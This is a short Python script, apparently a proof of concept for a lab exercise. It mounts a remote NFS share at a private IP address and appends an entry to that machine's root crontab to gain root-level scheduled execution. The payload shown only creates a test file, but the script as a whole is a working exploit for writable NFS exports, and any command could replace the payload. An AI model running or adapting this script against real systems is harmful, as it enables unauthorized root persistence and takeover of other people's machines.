#! /usr/bin/env python3
import os
from os import path
import subprocess
import tempfile
import sys
from subprocess import call
ip = '10.0.2.16'
cron = "'* * * * * touch /home/joe/Desktop/testing'"
def some():
    subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
    subprocess.run(["export EDITOR='vim'"], shell = True)
    subprocess.run(["echo " + cron + " >> /tmp/r00t/var/spool/cron/crontabs/root"], shell=True)
    #f = open("/tmp/r00t/var/spool/cron/crontabs/root", mode = "a+")
    #f.write(cron)
    #f.close()
    subprocess.run(['umount /tmp/r00t'], shell=True)
some()